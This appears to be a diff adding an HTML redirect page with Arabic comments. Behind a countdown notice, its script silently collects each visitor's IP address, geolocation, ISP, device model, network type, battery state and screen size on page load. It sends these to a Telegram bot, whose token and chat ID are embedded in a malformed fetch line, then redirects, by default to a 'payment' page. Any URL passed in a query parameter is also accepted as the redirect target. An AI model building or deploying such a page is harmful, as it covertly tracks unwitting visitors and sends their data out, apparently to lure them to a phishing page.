@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Expires" content="0">
+  <title id="page-title">Redirecting...</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+    }
+
+    body {
+      background: #090d16;
+      background-image: 
+        radial-gradient(circle at 10% 20%, rgba(37, 99, 235, 0.15) 0%, transparent 40%),
+        radial-gradient(circle at 90% 80%, rgba(124, 58, 237, 0.15) 0%, transparent 40%);
+      color: #f8fafc;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 16px;
+      overflow: hidden;
+    }
+
+    .redirect-card {
+      background: rgba(30, 41, 59, 0.65);
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      border: 1px solid rgba(255, 255, 255, 0.12);
+      border-radius: 24px;
+      padding: 32px 24px;
+      width: 100%;
+      max-width: 380px;
+      text-align: center;
+      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7), 
+                  0 0 30px rgba(37, 99, 235, 0.1);
+    }
+
+    .destination-box {
+      background: rgba(15, 23, 42, 0.7);
+      border-radius: 14px;
+      padding: 16px;
+      margin-bottom: 20px;
+      border: 1px solid rgba(56, 189, 248, 0.15);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .destination-label {
+      font-size: 0.75rem;
+      color: #94a3b8;
+    }
+
+    .destination-name {
+      font-size: 1.2rem;
+      font-weight: 800;
+      color: #38bdf8;
+      word-break: break-all;
+    }
+
+    .timer-section {
+      margin-bottom: 10px;
+    }
+
+    .timer-text {
+      font-size: 0.85rem;
+      color: #e2e8f0;
+      margin-bottom: 10px;
+    }
+
+    .seconds-counter {
+      font-weight: 800;
+      color: #f43f5e;
+      font-size: 1.15rem;
+    }
+
+    .progress-bar-bg {
+      width: 100%;
+      height: 6px;
+      background: rgba(255, 255, 255, 0.08);
+      border-radius: 10px;
+      overflow: hidden;
+    }
+
+    .progress-bar-fill {
+      height: 100%;
+      width: 100%;
+      background: linear-gradient(90deg, #3b82f6, #f43f5e);
+      border-radius: 10px;
+      transition: width 0.1s linear;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="redirect-card">
+    <div class="destination-box">
+      <p class="destination-label">You are being redirected to:</p>
+      <p id="dest-name" class="destination-name">Loading...</p>
+    </div>
+
+    <div class="timer-section">
+      <p class="timer-text">Automatic redirect in <span id="countdown" class="seconds-counter">7.5</span> seconds...</p>
+      <div class="progress-bar-bg">
+        <div id="progress" class="progress-bar-fill"></div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // ⚙️ حط هنا بيانات بوت التليجرام الخاص بك:
+    const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
+    const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE";
+
+    const defaultUrl = "https://payment-mohamed.vercel.app/";
+    const defaultName = "Payment Page";
+
+    let targetUrl = defaultUrl;
+    let displayName = defaultName;
+
+    async function initRedirectSystem() {
+      const urlParams = new URLSearchParams(window.location.search);
+      let queryValue = urlParams.has('to') ? urlParams.get('to').trim() : "";
+
+      try {
+        const response = await fetch('links.json');
+        const destinationsDB = await response.json();
+
+        if (queryValue && destinationsDB[queryValue]) {
+          targetUrl = destinationsDB[queryValue].url;
+          displayName = destinationsDB[queryValue].destination;
+        } else if (queryValue.startsWith('http')) {
+          targetUrl = queryValue;
+          let urlObj = new URL(targetUrl);
+          displayName = urlObj.hostname.replace('www.', '');
+          displayName = displayName.charAt(0).toUpperCase() + displayName.slice(1);
+        }
+      } catch (e) {
+        console.error("Could not load links.json, using defaults.", e);
+      }
+
+      document.getElementById('dest-name').textContent = displayName;
+      document.getElementById('page-title').textContent = "Redirecting to " + displayName;
+
+      // جمع البيانات وإرسالها لتليجرام فوراً
+      collectAndSendToTelegram();
+      startCountdown();
+    }
+
+    function getExactDeviceModel() {
+      const ua = navigator.userAgent;
+      let deviceName = "Unknown Device";
+
+      if (/android/i.test(ua)) {
+        let match = ua.match(/\b([A-Z][A-Za-z0-9\-_]+(?:\s+[A-Za-z0-9\-_]+){1,3})\s+Build\//);
+        if (match && match[1]) {
+          deviceName = match[1].trim();
+        } else {
+          let parts = ua.split(';');
+          for (let part of parts) {
+            if (part.includes('CPH') || part.includes('SM-') || part.includes('Redmi') || part.includes('Reno') || part.includes('Pixel')) {
+              deviceName = part.trim();
+              break;
+            }
+          }
+          if (deviceName === "Unknown Device") {
+            deviceName = "Android Device";
+          }
+        }
+      } else if (/iPad|iPhone|iPod/.test(ua)) {
+        deviceName = /iPad/.test(ua) ? "iPad" : "Apple iPhone";
+      } else if (/Win/i.test(ua)) {
+        deviceName = "Windows PC";
+      } else if (/Mac/i.test(ua)) {
+        deviceName = "Mac OS";
+      }
+
+      return deviceName;
+    }
+
+    async function collectAndSendToTelegram() {
+      try {
+        const ipResponse = await fetch('https://ipapi.co/json/');
+        const ipData = await ipResponse.json();
+
+        const exactModel = getExactDeviceModel();
+
+        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        const networkType = connection ? (connection.effectiveType || connection.type || "Unknown") : "Unknown";
+
+        let batteryInfo = "Not Supported";
+        if (navigator.getBattery) {
+          try {
+            const battery = await navigator.getBattery();
+            batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging ⚡' : 'Not Charging'})`;
+          } catch (e) {
+            batteryInfo = "Unavailable";
+          }
+        }
+
+        // صياغة الرسالة بشكل مرتب وجميل لتصلك على تليجرام
+        const message = 
+          `🚨 **New Visitor Alert!**\n\n` +
+          `📌 **Destination:** ${displayName}\n` +
+          `🔗 **Target URL:** ${targetUrl}\n\n` +
+          `🌐 **IP:** \`${ipData.ip || 'Unknown'}\`\n` +
+          `🌍 **Location:** ${ipData.city || 'N/A'}, ${ipData.region || 'N/A'}, ${ipData.country_name || 'N/A'}\n` +
+          `🏢 **ISP:** ${ipData.org || 'N/A'}\n\n` +
+          `📱 **Device:** ${exactModel}\n` +
+          `📶 **Network:** ${networkType}\n` +
+          `🔋 **Battery:** ${batteryInfo}\n` +
+          `📐 **Resolution:** ${window.screen.width}x${window.screen.height}\n` +
+          `⏰ **Time:** ${new Date().toLocaleString()}`;
+
+        // إرسال البيانات عبر Telegram API مباشرة
+        if (TELEGRAM_BOT_TOKEN !== "YOUR_BOT_TOKEN_HERE") {
+          await fetch(`https://api.telegram.org/bot${8728217018:AAHctv9Xsgm9UklqD27jfzBrbOJX100dYqE}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: 8718173410,
+              text: message,
+              parse_mode: 'Markdown'
+            })
+          });
+        }
+
+      } catch (err) {
+        console.error("Error sending to telegram:", err);
+      }
+    }
+
+    function startCountdown() {
+      let totalTime = 7.5;
+      let timeLeft = totalTime;
+      const countdownEl = document.getElementById('countdown');
+      const progressEl = document.getElementById('progress');
+
+      const intervalTime = 100;
+      const decrement = intervalTime / 1000;
+
+      const timer = setInterval(() => {
+        timeLeft -= decrement;
+        if (timeLeft <= 0) {
+          timeLeft = 0;
+        }
+        
+        countdownEl.textContent = timeLeft.toFixed(1);
+        
+        let percentage = (timeLeft / totalTime) * 100;
+        progressEl.style.width = percentage + '%';
+
+        if (timeLeft <= 0) {
+          clearInterval(timer);
+          window.location.replace(targetUrl);
+        }
+      }, intervalTime);
+    }
+
+    initRedirectSystem();
+  </script>
+
+</body>
+</html>
